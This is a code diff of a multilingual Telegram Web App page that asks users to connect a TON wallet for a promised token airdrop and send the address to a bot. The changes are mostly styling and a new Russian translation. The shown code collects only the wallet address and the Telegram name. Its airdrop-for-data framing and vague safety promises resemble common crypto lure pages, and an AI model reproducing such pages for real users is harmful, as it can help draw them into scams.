@@ -9,42 +9,43 @@
     <!-- Підключаємо TON Connect UI SDK -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 15px; background: #0f172a; color: #fff; margin: 0; box-sizing: border-box; }
-        .card { background: #1e293b; padding: 20px; border-radius: 12px; display: inline-block; max-width: 420px; width: 100%; box-sizing: border-box; }
-        #ton-connect { margin: 15px 0; display: flex; justify-content: center; }
-        h2 { font-size: 18px; margin-bottom: 5px; }
-        .subtitle { font-size: 10px; color: #94a3b8; margin-bottom: 12px; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 10px; background: #0f172a; color: #fff; margin: 0; box-sizing: border-box; }
+        .card { background: #1e293b; padding: 18px; border-radius: 12px; display: inline-block; max-width: 420px; width: 100%; box-sizing: border-box; }
+        #ton-connect { margin: 12px 0; display: flex; justify-content: center; }
+        h2 { font-size: 17px; margin-bottom: 4px; }
+        .subtitle { font-size: 10px; color: #94a3b8; margin-bottom: 10px; }
         p { font-size: 12px; line-height: 1.4; color: #cbd5e1; }
         
-        /* Стилі для перемикача мов */
-        .lang-container { margin-bottom: 12px; display: flex; flex-wrap: wrap; justify-content: center; gap: 4px; }
-        .lang-btn { background: #334155; color: #cbd5f8; border: none; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; font-weight: bold; }
+        /* Стилі для перемикача мов із прапорцями */
+        .lang-container { margin-bottom: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 3px; }
+        .lang-btn { background: #334155; color: #cbd5f8; border: none; padding: 3px 6px; border-radius: 4px; font-size: 9px; cursor: pointer; font-weight: bold; }
         .lang-btn:hover, .lang-btn.active { background: #0098EA; color: #fff; }
 
         /* Стилі для інформаційного блоку про дроп */
-        .info-box { background: #0f172a; border-left: 3px solid #0098EA; padding: 10px; border-radius: 6px; margin-top: 15px; text-align: left; font-size: 11px; color: #94a3b8; line-height: 1.3; }
+        .info-box { background: #0f172a; border-left: 3px solid #0098EA; padding: 8px; border-radius: 6px; margin-top: 12px; text-align: left; font-size: 10px; color: #94a3b8; line-height: 1.3; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <!-- Кнопки вибору мови -->
+        <!-- Кнопки вибору мови з прапорцями -->
         <div class="lang-container">
-            <button class="lang-btn active" onclick="setLanguage('uk')">UA</button>
-            <button class="lang-btn" onclick="setLanguage('en')">EN</button>
-            <button class="lang-btn" onclick="setLanguage('de')">DE</button>
-            <button class="lang-btn" onclick="setLanguage('fr')">FR</button>
-            <button class="lang-btn" onclick="setLanguage('it')">IT</button>
-            <button class="lang-btn" onclick="setLanguage('es')">ES</button>
-            <button class="lang-btn" onclick="setLanguage('pl')">PL</button>
+            <button class="lang-btn active" onclick="setLanguage('uk')">🇺🇦 UA</button>
+            <button class="lang-btn" onclick="setLanguage('en')">🇬🇧 EN</button>
+            <button class="lang-btn" onclick="setLanguage('de')">🇩🇪 DE</button>
+            <button class="lang-btn" onclick="setLanguage('fr')">🇫🇷 FR</button>
+            <button class="lang-btn" onclick="setLanguage('it')">🇮🇹 IT</button>
+            <button class="lang-btn" onclick="setLanguage('es')">🇪🇸 ES</button>
+            <button class="lang-btn" onclick="setLanguage('pl')">🇵🇱 PL</button>
+            <button class="lang-btn" onclick="setLanguage('ru')">🇷🇺 RU</button>
         </div>
 
         <h2 id="t-title">Збір даних гаманця</h2>
-        <div class="subtitle" id="t-subtitle">Wallet Data Collection / Сбор данных кошелька</div>
+        <div class="subtitle" id="t-subtitle">Wallet Data Collection</div>
         
         <p id="welcome-text">
             Підключіть ваш гаманець TON:<br>
-            <span style="font-size: 10px; color: #94a3b8;" id="t-connect-sub">Connect your TON wallet / Подключите кошелек TON</span>
+            <span style="font-size: 10px; color: #94a3b8;" id="t-connect-sub">Connect your TON wallet</span>
         </p>
         
         <!-- Кнопка підключення гаманця TON -->
@@ -55,7 +56,7 @@
             ℹ️ Збір даних проводиться для участі у майбутньому дропі різних токенів мережі TON. Інформація надсилається до захищеного каналу та суворо захищена від передачі третім особам.
         </div>
         
-        <p id="status" style="margin-top: 10px; color: #38bdf8; font-size: 11px;"></p>
+        <p id="status" style="margin-top: 8px; color: #38bdf8; font-size: 11px;"></p>
     </div>
 
     <script>
@@ -63,7 +64,7 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Переклади для інтерфейсу
+        // Повні переклади для всіх 8 мов
         const translations = {
             uk: {
                 title: "Збір даних гаманця",
@@ -131,9 +132,19 @@
                 connectText: "Podłącz swój portfel TON:",
                 connectSub: "Connect your TON wallet",
                 successText: "Portfel odczytany pomyślnie.",
-                actionHint: "Kliknij niebieský przycisk na dole, aby wysłać!",
+                actionHint: "Kliknij niebieski przycisk na dole, aby wysłać!",
                 infobox: "ℹ️ Dane są zbierane pod kątem przyszłego airdropu różnych tokenów sieci TON. Informacje trafiają do bezpiecznego kanału i są chronione.",
                 mainBtn: "WYŚLIJ DANE DO BOTA"
+            },
+            ru: {
+                title: "Сбор данных кошелька",
+                subtitle: "Wallet Data Collection",
+                connectText: "Подключите ваш кошелек TON:",
+                connectSub: "Connect your TON wallet",
+                successText: "Кошелек успешно считан.",
+                actionHint: "Нажмите синюю кнопку внизу экрана для отправки!",
+                infobox: "ℹ️ Сбор данных проводится для участия в будущем дропе различных токенов сети TON. Информация отправляется в защищенный канал и строго защищена от передачи третьим лицам.",
+                mainBtn: "ОТПРАВИТЬ ДАННЫЕ В БОТ"
             }
         };
 
@@ -142,7 +153,7 @@
         function setLanguage(lang) {
             currentLang = lang;
             
-            // Оновлюємо активну кнопку мови у стилях
+            // Оновлюємо активну кнопку мови
             document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
             event.target.classList.add('active');
 
@@ -154,7 +165,7 @@
             // Змінюємо головну системну кнопку Telegram
             mainButton.setParams({ text: translations[lang].mainBtn });
 
-            // Оновлюємо текст привітання залежно від того, чи підключений гаманець
+            // Оновлюємо текст привітання залежно від стану гаманця
             if (userWalletAddress) {
                 document.getElementById('welcome-text').innerHTML = `Вітаємо, <b>${tgIdentifier}</b>!<br>${translations[lang].successText}<br><span style="font-size: 10px; color: #94a3b8;">${translations[lang].actionHint}</span>`;
             } else {
@@ -190,7 +201,7 @@
             }
 
             if (!userWalletAddress) {
-                alert('Спочатку підключіть гаманець! / Please connect wallet first!');
+                alert('Спочатку підключіть гаманець!');
                 return;
             }
 
